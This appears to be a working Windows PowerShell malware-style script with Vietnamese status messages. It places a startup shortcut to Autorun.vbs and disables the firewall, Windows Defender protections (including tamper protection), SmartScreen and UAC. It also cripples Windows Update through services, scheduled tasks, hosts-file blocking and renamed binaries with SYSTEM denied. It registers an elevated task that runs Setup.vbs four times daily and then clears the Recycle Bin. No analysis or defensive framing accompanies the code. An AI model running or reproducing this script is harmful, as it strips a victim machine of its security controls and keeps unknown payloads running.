$source = "C:\Users\Public\Downloads\Autorun.vbs"
$startupPath = [Environment]::GetFolderPath("Startup")
$destination = Join-Path $startupPath "Autorun.vbs.lnk"
if (Test-Path $source) {
    $WshShell = New-Object -ComObject WScript.Shell
    $shortcut = $WshShell.CreateShortcut($destination)
    $shortcut.TargetPath = $source
    $shortcut.WorkingDirectory = Split-Path $source
    $shortcut.WindowStyle = 1
    $shortcut.Save()
    Write-Host "Đã tạo shortcut thành công tại: $destination"
} else {
    Write-Host "File $source không tồn tại. Vui lòng kiểm tra lại đường dẫn."
}
$folder = "C:\Users\Public\Downloads\Startup Folder.lnk"
$acl = Get-Acl $folder
$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "Delete", "Deny")
$acl.AddAccessRule($accessRule)
Set-Acl -Path $folder -AclObject $acl
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

Stop-Service -Name "WSearch" -Force
Set-Service -Name "WSearch" -StartupType Disabled
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -SubmitSamplesConsent 2
Set-MpPreference -MAPSReporting 0
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableIntrusionPreventionSystem $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -DisableArchiveScanning $true
Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SpyNetReporting /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SubmitSamplesConsent /t REG_DWORD /d 2 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v DisableBlockAtFirstSeen /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Policies\Microsoft\Windows Defender Security Center\Notifications" /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f
Stop-Service -Name WinDefend -Force -ErrorAction SilentlyContinue
Set-Service -Name WinDefend -StartupType Disabled -ErrorAction SilentlyContinue

$services = @("wuauserv","UsoSvc","BITS","DoSvc","WaaSMedicSvc","SIHClient")
foreach ($svc in $services) {
    Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
    Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue
}

Remove-Item -Path C:\Windows\SoftwareDistribution\Download\* -Recurse -Force -ErrorAction SilentlyContinue
$tasks = @(
    "\Microsoft\Windows\UpdateOrchestrator\Reboot",
    "\Microsoft\Windows\UpdateOrchestrator\Schedule Scan",
    "\Microsoft\Windows\UpdateOrchestrator\UpdateModel",
    "\Microsoft\Windows\WindowsUpdate\Scheduled Start",
    "\Microsoft\Windows\WindowsUpdate\sih"
)
foreach ($task in $tasks) {
    try { schtasks /Delete /TN $task /F } catch {}
}
$pause = (Get-Date).AddDays(35).ToUniversalTime().ToString("2029-07-31T00:00:00Z")
$pause_start = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings' -Name 'PauseUpdatesStartTime' -Value $pause_start
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings' -Name 'PauseUpdatesExpiryTime' -Value $pause
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings' -Name 'PauseFeatureUpdatesStartTime' -Value $pause_start
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings' -Name 'PauseFeatureUpdatesEndTime' -Value $pause
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings' -Name 'PauseQualityUpdatesStartTime' -Value $pause_start
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings' -Name 'PauseQualityUpdatesEndTime' -Value $pause
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" -Name "DisableWindowsUpdateAccess" -PropertyType DWORD -Value 1 -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name "NoAutoUpdate" -PropertyType DWORD -Value 1 -Force
reg add "HKLM\SOFTWARE\Microsoft\WindowsSelfHost\UI\Visibility" /v "HideInsiderPage" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings" /v HideMCTLink /t REG_DWORD /d 1 /f
$hostsPath = "$env:SystemRoot\System32\drivers\etc\hosts"
$updateHosts = @"
127.0.0.1 update.microsoft.com
127.0.0.1 windowsupdate.microsoft.com
127.0.0.1 download.windowsupdate.com
127.0.0.1 wustat.windows.com
127.0.0.1 ntservicepack.microsoft.com
127.0.0.1 stats.microsoft.com
127.0.0.1 fe2.update.microsoft.com
127.0.0.1 sls.update.microsoft.com
127.0.0.1 test.stats.update.microsoft.com
"@
Add-Content -Path $hostsPath -Value $updateHosts
$updateFiles = @(
    "$env:windir\System32\usoclient.exe",
    "$env:windir\System32\SIHClient.exe",
    "$env:windir\System32\UsoClient.exe",
    "$env:windir\System32\WaaSMedic"
)
foreach ($file in $updateFiles) {
    if (Test-Path $file) {
        try {
            Rename-Item -Path $file -NewName ($file + ".disabled") -Force -ErrorAction SilentlyContinue
            icacls ($file + ".disabled") /deny "SYSTEM:(F)" | Out-Null
        } catch {
            Write-Host "Không thể xử lý $file"
        }
    }
}
$updateAssistant = "C:\Windows\UpdateAssistant"
if (Test-Path $updateAssistant) {
    try {
        Remove-Item -Path $updateAssistant -Recurse -Force -ErrorAction SilentlyContinue
    } catch {
        Write-Host "Không thể xóa Update Assistant"
    }
}

Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off"
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0
Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name 'ScreenSaveActive' -Value '0'

$taskName = "Run Setup.vbs Daily"
$setupPath = "C:\Users\Public\Downloads\Setup.vbs"
$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$setupPath`""
$trigger1 = New-ScheduledTaskTrigger -Daily -At 00:00AM
$trigger2 = New-ScheduledTaskTrigger -Daily -At 6:00AM
$trigger3 = New-ScheduledTaskTrigger -Daily -At 12:00PM
$trigger4 = New-ScheduledTaskTrigger -Daily -At 6:00PM
$principal = New-ScheduledTaskPrincipal -UserId "$env:UserName" -RunLevel Highest
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger @($trigger1, $trigger2, $trigger3, $trigger4) -Principal $principal -Force

Clear-RecycleBin -Force -ErrorAction SilentlyContinue
exit
